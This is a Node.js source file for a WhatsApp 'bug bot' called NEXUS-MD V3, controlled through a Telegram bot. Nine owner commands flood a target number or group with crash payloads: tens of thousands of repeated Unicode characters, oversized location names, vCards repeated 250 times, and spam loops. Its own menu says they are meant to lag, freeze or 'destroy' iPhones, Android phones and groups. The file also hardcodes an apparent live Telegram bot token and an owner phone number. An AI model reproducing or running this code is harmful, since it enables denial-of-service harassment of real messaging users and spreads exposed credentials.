const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion, 
    DisconnectReason, 
    delay,
    Browsers,
    makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require('pino');
const express = require('express');

// --- ⚙️ CONFIGURATION ---
const TG_TOKEN = '8745872876:AAEyEHrpuYeyP94PRcYlTXSkVjv-vMjKhf8';
const tgBot = new TelegramBot(TG_TOKEN, { polling: true });
const app = express();
const PORT = process.env.PORT || 3000;
const CHANNEL_URL = "https://whatsapp.com/channel/0029Vb7a9bO6RGJKJbh4xR0F";

let botConfig = {
    botName: "NEXUS-MD V3 ELITE",
    owner: "94767475809", 
    prefix: ".",
    isPublic: false 
};

app.get('/', (req, res) => res.send('Nexus System Online! ☠️'));
app.listen(PORT, () => console.log(`Dashboard Active on ${PORT}`));

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        logger: pino({ level: 'silent' }),
        browser: ["Ubuntu", "Chrome", "20.0.04"], 
        printQRInTerminal: false,
        syncFullHistory: false
    });

    // --- 🤖 TELEGRAM HANDLER (ENGLISH) ---
    tgBot.on('message', async (msg) => {
        const text = msg.text;
        if (text === '/start') {
            return tgBot.sendMessage(msg.chat.id, "☠️ *NEXUS-MD V3 BUG SYSTEM*\n\nPlease send your WhatsApp number to get the Pairing Code.\n*(Example: 94767475809)*", { parse_mode: 'Markdown' });
        }
        if (text && /^\d+$/.test(text) && text.length > 9) {
            try {
                tgBot.sendMessage(msg.chat.id, "⏳ *Processing... Please check your WhatsApp notifications.*");
                let code = await sock.requestPairingCode(text.replace(/[^0-9]/g, ''));
                tgBot.sendMessage(msg.chat.id, `🔥 *YOUR PAIRING CODE:* \`${code}\`\n\nEnter this code in your WhatsApp Linked Devices.`, { parse_mode: 'Markdown' });
            } catch (e) { tgBot.sendMessage(msg.chat.id, "❌ *Error!* Restart the bot."); }
        }
    });

    // --- 📩 WHATSAPP BUG HANDLER (ALL 9 MODES) ---
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message) return;
            const from = mek.key.remoteJid;
            const sender = mek.key.participant || mek.key.remoteJid;
            const isOwner = sender.includes(botConfig.owner) || mek.key.fromMe;
            
            if (!isOwner) return; 

            const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
            if (!body.startsWith(botConfig.prefix)) return;

            const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
            const text = body.trim().split(/ +/).slice(1).join(" ");
            const target = text + "@s.whatsapp.net";

            // --- 🦠 BUG PAYLOADS ---
            const bugMsg = "☠️" + "ꦿ".repeat(45000) + "᥋".repeat(45000);

            switch (command) {
                case 'menu':
                case 'bug':
                    const menu = `╭───〔 *NEXUS-MD V3* 〕───┈
│
│ 🦠 *ELITE BUG SYSTEM (9 MODES)*
│
├ ☠️ *1. .ios1* [num] - iPhone Hard Lag
├ 🔥 *2. .ios2* [num] - iPhone UI Freeze
├ 💀 *3. .kill* [num] - Android Destroyer
├ ❄️ *4. .freeze* [num] - System Lag
├ 📍 *5. .loc* [num] - Location Bug
├ 📇 *6. .vcard* [num] - Contact Crash
├ 🌀 *7. .group* [jid] - Group Destroyer
├ 🧨 *8. .bomb* [num] - Spam Bug
├ 🌌 *9. .the_end* [num] - Total System Wipe
│
╰─────────────┈
 👑 *DEV:* SASIYA MD`;

                    await sock.sendMessage(from, { 
                        text: menu,
                        contextInfo: { 
                            externalAdReply: { 
                                title: "NEXUS-MD ULTIMATE BUG BOT",
                                body: "Follow channel: " + CHANNEL_URL,
                                mediaType: 1,
                                thumbnailUrl: "https://telegra.ph/file/a8a183d25667e41793741.jpg", 
                            }
                        }
                    }, { quoted: mek });
                    break;

                // 1 & 2: iPhone Bugs
                case 'ios1':
                case 'ios2':
                    if (!text) return;
                    for(let i=0; i<10; i++) {
                        await sock.sendMessage(target, { text: "".repeat(50000) + "᥋".repeat(30000) });
                        await delay(500);
                    }
                    break;

                // 3 & 4: Android/System Bugs
                case 'kill':
                case 'freeze':
                    if (!text) return;
                    await sock.sendMessage(target, { text: bugMsg });
                    break;

                // 5: Location Bug
                case 'loc':
                    if (!text) return;
                    await sock.sendMessage(target, { location: { degreesLatitude: 37, degreesLongitude: -122, name: "NEXUS-" + "X".repeat(35000) } });
                    break;

                // 6: Vcard Crash
                case 'vcard':
                    if (!text) return;
                    const vcard = 'BEGIN:VCARD\nVERSION:3.0\nFN:Nexus Virus\nEND:VCARD'.repeat(250);
                    await sock.sendMessage(target, { contacts: { displayName: 'Nexus-MD', contacts: [{ vcard }] } });
                    break;

                // 7: Group Destroyer
                case 'group':
                    if (!text) return;
                    for(let i=0; i<10; i++) {
                        await sock.sendMessage(text, { text: bugMsg });
                    }
                    break;

                // 8: Spam Bomb
                case 'bomb':
                    if (!text) return;
                    for(let i=0; i<20; i++) {
                        await sock.sendMessage(target, { text: "🔥 SPAM 🔥\n" + "҈".repeat(10000) });
                    }
                    break;

                // 9: The End (Total Wipe)
                case 'the_end':
                    if (!text) return;
                    await sock.sendMessage(from, { text: "🌑 *SYSTEM WIPE DEPLOYED...*" });
                    for(let i=0; i<15; i++) {
                        await sock.sendMessage(target, { text: bugMsg + "꠵".repeat(20000) });
                        await delay(300);
                    }
                    break;
            }
        } catch (e) { console.log(e); }
    });

    sock.ev.on('connection.update', (up) => {
        if (up.connection === 'close') startNexus();
        else if (up.connection === 'open') console.log('✅ ELITE BUG BOT READY!');
    });
    sock.ev.on('creds.update', saveCreds);
}

startNexus();
